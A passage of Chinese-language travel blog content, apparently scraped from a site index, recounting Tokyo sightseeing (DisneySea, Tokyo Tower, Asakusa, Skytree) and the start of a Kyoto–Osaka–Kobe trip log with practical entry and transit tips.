的鋼彈完成品因為不是鋼彈迷，因此我進場逛了一下看了幾場表演就先離開了。台場改前往台場，從汐留出發到台場的電車很酷，一路上可以看到富士電視台跟整個台場的景觀。抵達台場後先來看台場的自由女神。是紐約的自由女神的1/7， 象徵日法的友好關係。再往前走一點回頭一望就是在烏龍派出所裡被阿兩破壞很多次的富士電視台再往前走一點到商場吃章魚燒跟台灣雞排？章魚燒普，太多顆很膩；雞排蠻特別的，雖然寫台灣唐揚，不過實際是日式雞排(薄、無骨)然後用台灣裹粉的炸法，跟台灣雞排還是不一樣，不過我還是跟店員說好吃、我是台灣人🤣。本來打算去台場的百貨公司買買衣服鞋子，但快到的時候撇見地鐵能到新宿；就突然拐個彎前往新宿了。新宿開始逛街走走看看去 La Lebo 聞了一下東京專屬的 GAIAC 10 號味道覺得很淡…木質調…聞不太出來。(但 Day 4 還是下手了)最後只去百貨公司買買衣服褲子跟藥妝，天氣開始陰雨就折返回飯店了。一樣用吃結束這一天熱狗好吃、水果酒好喝！Day 3 迪士尼海洋一早出發，當天早上天氣陰雨綿綿。 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort我們買的是海洋，沒買陸地， 那個漂亮的城堡陸地才有；海洋的入口要再搭園內的電車去。 入園後開始抽抽可以抽的表演或入場，但都沒中，最後我們購買晚上的表演煙火活動「 堅信！～夢想之海～ 」的前排位子(不買也可以在外圍看，表演在港灣公共區域)。雨越來越大，於是先去路邊商店買米奇雨衣：個人覺得質感材質都蠻好的，還有可愛的米奇或米妮圖案(深紅色)可以選，而且不貴！！ 幸運的是中午後就沒下啦！！我不是雨男！！買完雨衣就直衝「 玩具總動員瘋狂遊戲屋 」：人很多，大概排了 100 多分鐘才排到：遊戲內容是 2 人一組(1 人就跟人機)操作按鈕射投影氣球得分，趣味性高，刺激性低，很適合情侶或親子。旁邊還有蛋頭先生的互動劇場表演跟小的紀念品店：很可愛的抱哥玩偶！！再來是「 翱翔：夢幻奇航的圖像 」，也是熱門遊樂設施：排隊入場後在遊戲開始之前會有場景開始帶入，探險家的故事，掛在牆上的畫，其實是高解析螢幕，有動畫跟講話，效果很厲害！劇場，球型巨幕＋4D 體驗(座椅會上升前進＋空氣味道)；內容是世界各地的風景，例如大草原就會有草原的味道；很驚艷，適合所有人！ 這邊我們是買快速通關。玩完這兩個設施之後接近中午時分，開始覓食，因為餐廳都滿了就只能找小吃類的食物，我們就隨便吃了 Pizza、雞腿…等等。拿著食物出來剛好港灣表演活動「 眾彩同慶 」開始：吃飽開始在園區繞繞逛逛紀念品店：消化的差不多後開始排「 地心探險之旅 」：大約需要 90–100 分鐘，排到剛好完全消化完了，不然太刺激XD內容是復刻電影地心歷險，場景跟沈浸很厲害；最後會有加速＆稍微地往下衝(失重感)，刺激感較強但不會到真的腿軟，適合想找尋一點刺激的朋友。出來後又去旁邊的「 海底兩萬哩 」緩和一下：沒什麼人，內容是仿造的潛水艇下水探索的感覺(但應該是模擬)，刺激性很低，只適合小小孩。坐完繼續逛逛吃吃：很可愛但很甜的米奇冰棒，還有安娜貝爾(玲娜貝爾)。繼續走走拍拍，園區真的很大，單純拍一些造景，動畫類夢幻場景都沒拍：走到底後又去搭了「 印第安納瓊斯冒險旅程：水晶骷髏頭魔宮 」：沒有地心探險之旅刺激(不會失重往下衝、也沒那麼快)，內容是電影印第安納瓊斯的沈浸場景，個人覺得有趣好玩。繼續走馬看花：也搭了「 迪士尼海洋渡輪航線 」與「 迪士尼海洋電氣化鐵路 」因為走得腳很酸，沿途順便看看風景不錯；比較偏向園區內交通設施，無特別遊樂效果。時間接近傍晚時，開始大買特買跟拍照：不得不說很容易買瘋了，因為很多 40 週年限定；順便跟地球拍照。接近表演開演時間後開始走回港灣，入場席地而坐。如前述，我們有加購一般席的觀賞位子。整場表演陳進體驗感很強，包含音樂、投影(後面火山會爆炸！)、雷射、煙火、迪士尼海洋相關角色劇情…結合得很好，一定要留到晚上看完表演才值回票價。 整天的迪士尼體驗下來的心得是，所有設施都很有沈浸感，不是單純的遊樂設施，而是希望遊客能融入那個角色與場景；雖然刺激性不如環球，但我覺得趣味性很足；晚上的煙火表演一定要看！ 很多可愛的周邊要控制好自己的手(剁手手)！ 食物方面都亂吃，覺得從外面帶自己的食物進來應該比較好。 時間允許的話要兩天陸+海，海的沒有夢幻城堡跟陸地上的遊行QQJR 舞濱車站外面還有最後一家周邊專賣店可以買，最後又逛了一下，才依依不捨的離開。回飯店後，繼續每日慣例；今天吃醬油泡麵、哈密瓜果肉果汁(好喝！！)、秋雅的梅酒(好喝！！)、烏龍燒酒（沒什麼味道，不好喝）。Day 4 東京鐵塔、明治神宮、Le Labo、龜有烏龍派出所、淺草雷門、晴空塔一早睡飽後，才開始想今日行程(瘋狂 ENFP)，大家一起的只有晚上的晴空塔；早上朋友們去秋葉原了，是個獨自探索東京的一天。東京鐵塔看了地圖，新橋離東京鐵塔不遠；就決定先去那兒了。走出門發現地鐵有事故嚴重誤點，看 Google Map 距離不遠，就改用走的了(約 20 分鐘)：一人徒步在東京街頭看看風景，6 月還不會太熱，吹吹風很舒服。在路邊遇到賣熱呼呼的烤蕃薯快走到東京鐵塔時經過一個公園「Tokyo Metropolitan Shiba Park⁩」從這邊的樹枝間看鐵塔也別有一番風味：繼續走過個山腳路，就到東京鐵塔下了。 KKday 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票進入鐵塔後買了 Top Deck 門票；除了可以上到鐵塔最頂端還包含導覽(有中文語音)，並且附送一張到此一遊的紀念照片！(體驗很棒)導覽有類似昨天迪士尼會動的壁畫ＸＤ兩位前人在對話，內容那略是要蓋一棟日本有標誌性的建築物，同一位建築師另一個作品是大阪的通天閣。早上鳥瞰東京景觀也不錯，第三張遠方就是晚上要去的晴空塔。最後附上免費的登頂成功紀念照！明治神宮去完東京鐵塔，看了下地圖決定下一站去明治神宮。出地鐵又走了一大段 (約 30 分鐘)才到明治神宮內。比較特別的事是剛好遇到日本傳統婚禮，在旁參觀：最後在本殿完成參拜就離開了覺得明治神宮比較莊重嚴肅，後面去淺草寺覺得觀光客太多很雜。下一站是自己從小看到大的龜有-烏龍派出所，想去看看長怎樣；在去的路上時先去表參道的 Le Labo 再次聞聞看。LE LABO 青山店其實我對 Le Labo 興趣不大，個人比較喜歡 Ormonde Jayne 的香水，而且 Le Labo 給我一種大眾賣包裝的感覺。聞了一輪買了 Another 13，味道夠濃；還有不免俗跟風買了東京專屬的 Gaiac 10，都買 15ml 當紀念。Le Labo香水都是現場封裝跟貼標的(約需等 15–20 分鐘)，可以客製化自己的標籤；13 是我自己喜歡的所以選「ZhgChgLi」、10 是代表東京，用破英文問店員哪個能代表日本，他說 ♨️ 😝。日本 Le Labo 價格如上，加上免稅最後 13 再少 $1,000 日圓。東京專屬的 Gaiac 10 比較貴，免稅後還要 $16,800 日圓。龜有烏龍派出所買完就繼續往龜有搭（龜有真的蠻遠的）。一出站正門就有烏龍派出所的人像：看地圖先跑去後站的龜有公園逛逛：就只是一般的公園QQ，很多小孩在裡面踢球就這樣，公園椅子有一個阿兩的坐姿人像，被放滿小孩的東西包包類，就沒拍了。查網路附近的 Ario 百貨公司有烏龍派出所的場景跟樂園，於事繼續走去(約 10 分鐘)：進去後心態崩了，幾乎可以確定歸有已經不維護烏龍派出所這個 IP (年輕人都不看了…) ；除了車站出來的人像外，從前面的日常公園到所謂的烏龍派出所樂園，目前也只剩下佈景還在，佈景之外已經改裝成遊樂場(夾娃娃機)了。最慘的是入口的阿兩扭蛋機，阿兩人像的眼睛破掉也沒修，整個很淒涼；最後扭了一個熱褲刑警，就悻悻然地離開了。看地圖搭公車到淺草比較近，查路線＆走到公車站大概花了 15 分鐘：走到公車站的路上幾乎都沒人、也沒觀光客，公車站路線 Google 連翻譯也沒；真的來到非觀光區了。上公車時還出了烏龍，因為在京都搭是下車才收費，所以上車就呆呆地站著，又聽不懂日文，直到好心的日本乘客說 pay pay 我才意會到去前面刷卡付費。一路上很安靜舒服，日本司機都會等到客人坐好、起身下車才會啟動；一路晃晃悠悠到淺草寺。 KKday 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 KKday 【東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘)觀光客真的超級超級多啊！！有夠擠，只能找角度拍了。繼續往內淺草寺走，觀光客實在太多了，本來沒打算買任何東西，就只是走來看看；途中吃到這家豆子店，意外的好吃就買了當伴手禮。到淺草寺後人還是一樣很多，拍拍照片就離開了。這時時間也接近傍晚，開始慢慢的往晴空塔移動。淺草寺遠眺晴空塔。晴空塔因為時間還早，所以一樣用走的一路看風景過去。 KKday 東京晴空塔展望台門票 / 享樂套票Tokyo Subway 24-hour Ticket / 墨田水族館越走越近，越來越大。走到晴空塔後，先在裡面的商場逛逛，點了杯北海道草莓冰淇淋休息一下。晴空塔我們沒買到 Top Deck，只買到中間景觀，7點入場。剛上去時還沒天黑，先隨手拍了幾張：日落後，可以鳥瞰整個東京的夜景，很美：第一張圖左上角就是遠方的東京鐵塔；裡面很暗、玻璃會反光不太好自拍人像。免強拍了一張ＸＤ離開前最後回眸一拍。最後一晚吃吃居酒屋、拍拍路上的夜景記錄：鶏の炭火焼日本今天開始天氣也不好了，沒想到每天經過的汐留就能看到東京鐵塔、還有特別的裝置藝術，最後一天才駐足欣賞。最後一晚的宵夜還是日清泡麵好吃加上超商炸雞🤤！前幾天買哈密瓜的果肉果汁，今天買草莓的，一樣好喝；清酒沒印象，這兩隻應該普普。Day 5 國會議事堂、皇居、東京車站、回程起床後去寄放行李，同 Day 4 獨自隨性看感覺探索東京，因為是晚上的飛機，還有大半天可以晃，天氣陰雨不佳。想到昨天在晴空塔扭蛋機看到日本代表地標有一個國會議事堂沒看過，就先朝這邊去。國會議事堂趣事之一是在路上遇到日本極端主義的抗議：開著宣傳車在國會議事堂附近大聲廣報，被警察攔下來後警察拆除他的廣播器；後來又加速闖紅燈逃跑，到處都警察，有點可怕。經過國會議事堂看大門緊閉就沒進去了(好像可以從側門進去參觀?)：遠遠的拍一張到此一遊照，就往下往皇居走了。皇居皇居真的很大，光從最外面走道入口就大概花了快 30 分鐘。走到天守台之後就離開了，當天皇居內也沒有開放參觀。大概又走了快 1 小時回到東京車站一代(可以搭地鐵，但就一兩站；我喜歡在街頭走走看看風景)。東京車站此時也接近中午，在東京車站內亂逛；只是證明一下自己不會迷路，但很懶得排有名的伴手禮店。最後一餐吃天婦羅蕎麥麵。順手去賣酒的商鋪帶一大一小清酒回台灣，店員還是台灣人。回程約莫下午 4 點多回飯店拿行李，開始慢慢移動到成田機場。新橋離開前一隅。回程直接從新橋去成田空港因為班次問題跟時間很充裕，搭的是都營淺草線機場快線，大約 1 小時 15 分多會到； 但不能用刷卡、Sucia 買票，於是當下東拼西湊湊齊三個人的票錢，差一點買不起 。到機場時大約 5:30 還很早。出境之後時間也還很早，隨便吃個東西墊墊胃然後最後一逛免稅店。發現要買獺祭或常見伴手禮(白色戀人、香蕉蛋糕…)這裡什麼都有，在這裡買就好了ＸＤ獺祭跟我在東京車站買價格差不多。上機，Hey 🇹🇼：日本天氣狀況很不好，一路搖搖晃晃(死魚眼)，比迪士尼的遊樂設施還刺激，一度停止共餐；還好最後安全抵達台灣。出境入關弄一弄大約 00:12 了，搭白牌計程車回台北差不多 01:30；洗個澡直接睡，結束這一堂旅程。後記 日本相關文化心得請參考上篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」 日本時間表示法是 30小時制，25:00 代表凌晨 01:00 很酷 日幣真的要留至少 1 萬上下在身上，避免遇到不能刷卡或不能刷 Vias 卡的狀況 感謝這次的旅伴， Sean INFJ/James ISTJ 規劃大神；Sean 迪士尼怎麼玩先玩哪個、哪個買快速比較值得都是他控場的回台灣後一直重複播的洗腦歌。KKday 推廣 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 SHIBUYA SKY 展望台電子門票｜即買即用 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘) 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 1,641 Total Views Last Statistics Date: 2025-01-19 | 1,602 Views on Medium. " }, { "title": "遊記 2023 京阪神 8 日自由行", "url": "/posts/76d66c2e34af/", "categories": "Z 度旅行遊記", "tags": "生活, japan, kyoto, osaka, traveling", "date": "2023-07-07 20:13:20 +0800", "snippet": "[遊記] 2023 京阪神 8 日自由行2023/05 京都、大阪、神戶 8日自由行紀錄及食住行入境資訊前言之前只去過 2019 🇲🇾 Sabah 跟 2018 🇹🇭 Bangkok 兩個東南亞國家並且都是跟團。很喜歡東南亞萬里無雲的藍空和不受拘束的放縱ENFP身為一個熱情衝動、說走就走的 ENFP，此次行程從提議到出發中間只間隔了兩週；起因是友人 黃馨平 剛好有職涯 GAP，他也剛好 EN...", "content": "[遊記] 2023 京阪神 8 日自由行2023/05 京都、大阪、神戶 8日自由行紀錄及食住行入境資訊前言之前只去過 2019 🇲🇾 Sabah 跟 2018 🇹🇭 Bangkok 兩個東南亞國家並且都是跟團。很喜歡東南亞萬里無雲的藍空和不受拘束的放縱ENFP身為一個熱情衝動、說走就走的 ENFP，此次行程從提議到出發中間只間隔了兩週；起因是友人 黃馨平 剛好有職涯 GAP，他也剛好 ENFP 互補人格 INFJ；我提供熱情方向，他提供細節計畫，一搭一唱下，就臨時起意就出發了。KKday 推廣 【一人成行】京都天橋立一日遊｜伊根灣遊船・天橋立・美山茅屋之里｜大阪難波出發 海之京都《神隱少女》觀光列車一日遊｜丹後紅松號／黑松號・天橋立 View Land・ 觀光船・傘松公園｜大阪出發 【1人成行】京都奈良一日遊｜嵐山＆伏見稻荷大社＆金閣寺＆奈良公園｜可選日式午餐方案（大阪、京都出發） 日本環球影城｜環球影城 Universal Studios Japan 門票 &amp; 環球特快入場券（快速通關 Express Pass） 日本 JR PASS|關西地區鐵路周遊券|eMCO 電子票 日本 JR PASS|關西廣域鐵路周遊券|eMCO 電子票 關西&amp;山陰地區鐵路周遊券 JRPass 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案行前準備樂因為一切都很隨性，只安排要去大阪環球，因此先從網路買門票；因為時間太靠近了，什麼都賣完了，只能買普通入場門票。 日本熱門景點、樂園真的都要提早買 Orz ，這次敗在棒球，現場連票都沒有，只能場地一日遊。其他景點、寺廟、旅程，隨性。日幣一定要換，大部分的寺廟門票、紀念品、御守跟部分電車(要買有座位的話)只能使用現金。這次我換 $50,000 日幣，最後還剩 $15,000 上下。行🛫距離出發時間不到一個月，沒什麼好挑的了，直接上 SkyScanner 找了一個符合我們兩個隨性步調的航班：桃園 &lt;-&gt; 關西 5/22 長榮 BR 130 13:35 TPE -&gt; KIX 17:15 (實際延誤 1 小時多，18:40 才到日本) 5/29 長榮 BR 177 11:10 KIX -&gt; TPE 13:05來回： $14,915好像是去年開始行李托運改成計件＋計重，每人限一件 &amp; 23kg 內；其他都要加錢。 因信用卡刷卡買機票會送旅遊保險，因此建議個人分開來買機票，並要查一下銀行信用卡的保險內容，有的簽帳卡可能沒有。另外也可以自己加保旅遊險（醫療、不便、遺失、意外…）這次保 8 天大概 $1,500。The Flight Tracker推薦安裝 The Flight Tracker App 輸入航班資訊就能實時追蹤航班資訊，包含航廈、登機門、行李櫃檯資訊。(有更改他也會通知，不過還是以現場資訊為主)飛機起飛前幾個小時還可以開啟 iOS Live Activiy 功能實時追蹤📲網路我是直接上 KKDAY 買 8 天吃到飽的 SIM 卡約 $700；也有 E-SIM 版本，但是我還是習慣抽換實體 SIM 卡，心裡比較保險。 可以把 SIM 卡(含 SIM 卡針)放隨身，飛機安全著陸後在機上就能換成日本 SIM 卡 記得換完後要去設定開漫遊，然後重開機 日本的吃到飽不一定是真的吃到飽，超過某個流量會被降速，詳細可詢問賣家；建議要傳影片或看影片還是要連 Wi-Fi🚈電車地鐵或公車都可直接使用 Sucia 西瓜卡；部分超商、購物也可以使用。iPhone 可以直接去「錢包與 Apple Pay」-&gt;「加入卡片」-&gt;「交通卡」-&gt;「日本」-&gt;「Sucia」-&gt; 直接啟用虛擬 Sucia。 但要使用 Master Card 的信用卡進行儲值，我用 Visa 卡都儲值失敗； 建議一定要在台灣就先弄好儲值好，不然去日本發現不能儲值、也收不到簡訊驗證碼，等於直接不能用。如果不能用 iPhone Sucia 或是 Android；目前日本實體 Sucia 都缺貨，只能買 28 天 Welcome Suica 限時西瓜卡，可以儲值、使用， 但期限過後即失效、也不能退款 。Apple Watch 也有 Suica 可以用（與 iPhone 不互通），記得在台灣也先設定好、儲值好。iPhone 交通卡在感應時不用特別把 Apple Pay 畫面叫出來，只要裝置拿出來就能直接感應（會自己喚醒感應）。住主要是用 Agoda 找距離電車地鐵站近的。京都 2 晚： 東橫INN京都四條大宮東橫 INN 是東北亞通的朋友推薦的連鎖飯店體系，CP 值高也不會踩到雷，而且有附日式早餐(飯糰 or 咖哩飯)。因訂的時間太晚，只剩四條大宮的東橫 INN 還有空房；距離京都車站比較遠，大約 3 公里：2人共 NT$3,844大阪 4 晚： APA Hotel Osaka Umeda (大阪梅田)一樣因為訂的時間太晚，選擇不多；我們選擇距離車站較近但價格較高的另一個連鎖飯店體系 APA；無附早餐，但有游泳池、公眾湯屋…等設備。從大阪梅田車站出來走路大約 15 分鐘會到：2人共 NT$21,459預入境申請 (加速通關)無需特別申請簽證、無需提供 COVID 疫苗/核酸證明；機票與訂房都完成後，就可以去 Visit Japan 填寫欲入境訊息，到時候下飛機手機連上網路後，就能直接入境，沒預先申請的話只能當場填寫紙卡。1.註冊： https://www.vjw.digital.go.jp/main/#/vjwpco001 帳號 因密碼規則可能不是平常自己習慣的密碼；因此請牢記，或另外寫下來，避免在日本入境要使用時忘記密碼登不進去2.選擇「登錄入境、回國預定」3.輸入入境航班資訊圖片僅共示意旅行名稱：自訂，給自己看的4.輸入在日聯絡處圖片僅共示意我是輸入第一天住宿的飯店資訊，用 Google 查英文版的飯店地址、飯店聯絡電話 (應該不用太精確，不要太離譜就好，至少飯店名稱要對)5.登陸預定圖片僅共示意6.選擇「返回入境、回國手續」繼續填寫資料7.選擇「外國人入境紀錄」8. 填寫基本資料入境天數包含到達到離開，一共 8 天。最後一步完成登錄：9.再次選擇「返回入境、回國手續」填寫「海關申報準備」填寫完基本資料後，一路選擇「否」到最後完成登錄:10.完成入境時步驟： 連上網路，登入網站 第一步，入境審查，找到「入境審查準備」選擇「顯示 QR 碼」 下拉到網頁底部找到「顯示 QR 碼」[2024–11–25 更新]「入境審查」與「海關申報」QR Code 已合併成同一個「入境审查及海关申报的QR码」，沒有藍碼黃碼區別，以下內容只當紀錄，可以忽略。 將護照與 QR 碼給簽證官即可 (黃碼) 第二步，領完行李出關，點擊「海關申報 QR 碼」(藍碼)在自助出關審查機器上，掃描完護照及此 QR 碼，確認完畢即可完成出關入境。Day 1 出發登入航空公司網站或 Email 進行線上報到，並可以直接把機票加入 Apple Pay，完全電子化。A1 台北車站 預辦登機因為是中午的飛機，早上慢慢出門，9 點到機捷 A1 台北車站辦理預辦登機：預辦登機 = 在 A1 台北車站 (A13 新北產業園區也有) 就辦好報到＋行李安檢＋托運行李了；到機場就能直接出境，不用去櫃檯人擠人。如果是從捷運走過來，記得不要直接下手扶梯到底進機捷，預辦登機在機捷外面。限制： 只有部分航空公司可以，詳情請參考 官方網站 需當日航班起飛前3小時完成登機手續、行李託運服務時間： A1 台北車站 06:00~21:30 A3 新北產業園區站 09:00~16:00兩手空空搭機捷去機場 -&gt; 第二航廈記得先上 機捷官網查詢機場 直達車 班次，比較好控制到機場的實際時間； 務必要搭直達車 。等飛機太早出門＋預辦登機，出境後還有快 3 小時才起飛。中午沒什麼人的機場吃個林東芳牛肉麵等飛機居然有興波咖啡！因降落延後導致起飛也跟著延誤了一個多小時不知道是不是因為預辦登機的關係，候機時地勤有廣播唱名我們去確認人有到，有要登機。Bye 🇹🇼飛機著陸，換好日本 SIM 卡連上網路之後就可以登入 Vista Japan 完成入境及出關手續。前往京都出關西機場後我們就直接搭 JR關空特急HARUKA 到 京都車站 ，大約 1 個半小時，途中只停靠幾站就到了。建議去售票機買票才會一定有座位。一出車站就看到標誌性的京都塔再轉搭計程車到飯店(因為有行李箱就不搭公車了，不然有公車會到)；加上飛機延誤，第一天到飯店的時候已經晚上 9 點多。東橫INN京都四條大宮飯店櫃檯有一位姊姊會說中文，跟他請教了明日的行程要怎麼去比較順～很親切方便！房間很酷，是萬全鏡像的兩個單人間然後打通共用衛浴。はなまる串カツ 製作所 大宮店時間很晚了，飯店東西放完就走出來到附近找吃的，選定了一家炸串店進去。梅子茶泡飯最便宜一串 80 日圓起，新鮮好吃又便宜！意外的驚喜跟喜愛，第二天想再造訪就遇到店休了 QQ吃完不免俗要去便利店 LAWSON 買宵夜回飯店繼續吃：醬油炒麵普普，吃起來很膩。Day 2 (清水寺、金閣寺、京都塔)一早起床先下樓打包早餐回房間吃：咖哩飯，吃完有點太 Heavy 還是習慣西式或台式的早餐。八坂神社吃飽飯搭公車前往八坂神社：一路步行前往清水寺京都的街頭乾淨到可怕，就連路邊水泥墩都不會出現髒髒黑黑的狀況。從八坂神社往上走到清水寺大約要 1–2 公里多，不過就當看街道風景吧！八坂塔中途找了家店喝了冰抹茶跟吃黑糖糰子：還有好吃的清酒冰淇淋：清水寺抵達太陽很大，人很多音羽瀑布排隊引用祈求學業、戀愛、健康長壽。參拜結束下山走回八坂神社，路上隨便吃了個蓋飯跟跟風買杯%咖啡下午搭公車前往「高雄」…. . (開玩笑的，是金閣寺)下車後大約走個 15 分鐘即可抵達金閣寺：金閣寺回程公車站擠了很多人，腳勤的朋友可以跟我們一樣走到下一個街口搭其他路線公車避開人群，前往京都塔。京都塔約莫下午 5:30 抵達京都塔觀景台：可以鳥望萬里無緣的京都，樓下有酒吧；本來想說先下去休息一下，晚上再上來看夜景，但我們吃飽要上來的時候才發現不能重新入場，要再重買票，所以就放棄了。補一張出去後從外拍的京都塔夜景。(天氣真的很好)可愛小物一樣去超商買個宵夜泡麵回飯店吃。Day 3 (嵐山、大阪)第二天就沒吃飯店的早餐了，一早睡飽起來 check-out 寄放行李，出門去嵐山。吃麥當勞早餐(比台灣便宜 $15 塊)吃完直接走到對面搭車到嵐山四條大宮就是起站，直接搭到底站嵐山，非常方便而且一定有位子。嵐山抵達：後先往嵐山方向走：可以體驗坐船看看河景(類似小碧潭？)體力好可以選擇小小健行登山：我們跑去登山看猴子跟鳥瞰景觀，從山下到山上大約要 30–45 分鐘，不難走。真的有猴子下山後往回走，路上邊吃了午餐天婦羅蕎麥麵：點錯，不應該點洞飯，會變成蕎麥麵＋天婦羅洞飯。吃飽後往另一個方向前往「大本山天龍寺」：大本山天龍寺從天龍寺後門出來直接去竹林：人真的很多，拍照要找好角度🥵由下往上拍也很美。下山吃冰，準備打道回府順手買了當地產的清酒回四條大宮去飯店領行李準備前往大阪：飯店外就是阪急大宮站第一天來這的時候還覺得有點不方便，因為離京都站有距離；但後來才發現其實很讚；在金閣寺、清水寺的中心點，出來就有往嵐山的直達電車，要去大阪也是直接出來搭電車就到了（記得大概一小時）。大阪初來乍到覺得好容易迷路，出口很多，大阪、梅田其實只的都是同個地點。抵達 APA 飯店黃馨平飯店頂樓有免費的露天泳池、飯店內有超商、免費大眾湯屋。放完行李後出門覓食：テング酒場 曽根崎 お初天神通り店，五串烤雞肉 日幣385…比台灣便宜啊！吃飽後在車站附近亂逛遊樂場有對自己吐槽的白熊！！Day 4 大阪城、鶴橋、任天堂按照 Google Map 指示，搭電車再走路到大阪城，走路部分一路從車站到護城河再到主城，大概需要走 30 分鐘，有點距離。 人工櫃檯排隊買票排得非常長，可以從 網路購買 免排隊直接入場。大阪城登頂鳥瞰大阪景觀：裡面每層都有戰國歷史介紹：離開大阪城後在附近走了一大圈晃晃兼找吃的。然後前往市郊鶴橋找一些小店買東西。鶴橋在鶴橋走了一大圈，這邊應該是非觀光區，遊客很少；蠻多韓國周邊商店，比較像日本人的韓國城。單純來找小點買韓國文創小物，後來發現台灣也有賣 - _ -任天堂走了一大圈大阪，腳底要不行了；所幸折返回去，回大阪梅田車站時順路去逛了一下任天堂。大阪任天堂，就在車站旁邊的大丸百貨樓上。直接失心瘋買爆薩爾達周邊：每個東西都很有質感，徽章是金屬的，做工很細緻。Day 5 環球影城 KKday 日本環球影城 | 環球特快入場券（快速通關 Express Pass）沒買到快速通關、超級瑪利歐世界，也沒有提早起床去排隊；我們走一個佛系隨性路線，10 點多才入園。入園人數非常多，一入園就趕快在 App 抽看看超級瑪利歐世界門票；還好有大神 黃馨平 ，抽中瑪利歐世界 5 點入場資格。先去哈利波特主題區晃晃：奶油啤酒排隊買了奶油啤酒(無酒精、很甜)，覺得如果真的要收藏應該要買最貴玻璃的。下一站侏儸紀公園：排了遊樂設施，大約要排 45 分鐘；坐第一排。類似火山歷險，最後會往下衝🥵（我很怕失重感）。但還好有玩，後來看新聞，這個設施 6 月開始要重新整理，大概會停個幾年。玩完接近中午開始亂逛加覓食裡面的造景很真實，不說還以為在🇺🇸NO LIMIT! Parade! 遊行耀西！！初期意外的歡樂有趣，直至今日腦中還有那個旋律！會有花車（馬力歐、寶可夢、芝麻街…角色）還會有舞者帶動跳，每到一個段落會停下來拉大家一起動起來！所有工作人員包含維護秩序的也會一起跳，帶入感很強！超級瑪利歐世界東晃西晃約莫接近五點前往超級瑪利歐世界。不得不讚嘆這個場景設計，完全把遊戲世界搬到現實，猶如來到世外桃源！！因為接近閉園時間，就沒有買手錶玩互動場景，只去排了耀西的設施。每個細節都做得很精緻！道別閉園前去拍了一些環球的夜景，很多本來人擠人的地方，都變很好拍了。尤其是哈利波特主題區，原本魔杖互動的場景都排的很長，閉園前去都沒人，看到一個姊姊一個人玩爽爽每個互動場景ＸＤ最後拍了一下地球，再見環球。晚上吃了居酒屋，買了日清泡麵回去當宵夜（吃來吃去還是這個好吃）Day 6 神戶、道頓堀一早起床搭電車去神戶。先去逛神戶商店街嚐嚐有名的神戶牛可樂餅從商店街一路走到神戶港走到才發現神戶塔維修中QQ詳細完工時間不確定再走回程，一路逛逛神戶街道在神戶找了家咖啡廳休息一下：草莓巧克力奶昔冰沙，好喝但很甜。道頓堀從神戶去道頓堀一代晚餐去吃有名的 大阪新世界串カツいっとく 。吃完開始觀光客行程，拍拍景點、去藥妝店買東西。格力高回來台灣 看 IG 才發現拍錯了 ＸＤ，從旁邊百貨進去有更好的取景點。回飯店繼續吃泡麵喝清酒當宵夜。味道沒印象 KKday 大阪觀光必備景點套票｜大阪樂遊券 OSAKA e-PASSDay 7 甲子園、難波、藥妝、逛街採購倒數最後一天回台灣了，純走馬看花行程。甲子園，打卡失敗一早臨時起意決定去甲子園看阪神虎棒球比賽，搭乘地鐵到甲子園站。出站就是甲子園棒球場。但我們吃了個閉門羹，不像台灣球賽都一定有位子，阪神的比賽賣到 7 月都全部售罄；都要提早就買好，不然只能在球場外面一日遊了。最後在附近吃個東西買個阪神虎周邊、再去客多美喝個咖啡就離開了。我一直以為他叫「咖啡所」阪神虎貼紙難波離開甲子園後去難波走採購逛街行程。順便補吃一下路邊的章魚燒跟蟹腳可能去錯店家，覺得很普。一路又走回道頓堀一代，往後走到唐吉訶德本店。唯一本店有摩天輪逛完傍晚就回大阪，在住的附近找一間居酒屋吃完最後的晚餐。再看一眼最後的大阪夜景。Day 8 回程中午的飛機，一早 7 點就 checkout 準備去關西機場了。今天開始大阪也變天了，開始陰天下雨，正好符合告別的心情。最後拍了一張大阪大樓景觀當告別。 本來打算搭電車到關西機場，但要拖著行李上上下下的；前 一天回來的時候特別探了一下搭客運的路線（包含時間跟車站位子） 一早就先去客運看人多不多，所幸排隊的人不多，我們就買了到關西機場的客運車票，舒舒服服的搭客運直達關西機場了。沿途還能一路欣賞最後的大阪景觀剛到機場被櫃檯排隊人群嚇到，落落長。最後發現排錯櫃檯，我們已經線上點一點完成報到，可以直接去排行李托運櫃檯！直接省了快一小時。 其實很想跟排隊的人說，你現在網頁打開點一點領好電子機票，就能去排托運然後出境了。出境後，關西機場整修中，沒什麼吃的跟店家，最後又買了新世界的豬排咖哩吐司。候機，回台灣囉。下午時分安全抵達台灣，回家休息！🇹🇼戰利品其實沒買什麼東西，就是看到什麼買什麼；藥妝最後比較下來發現京都車站出來的藥妝店最便宜（大概比大阪便宜 $100-$300 日圓）其中唐吉訶德最貴。Yodobashi 的主題曲真的洗腦，在京都逛完直接被洗腦。日本免稅規定是要滿 $5,000 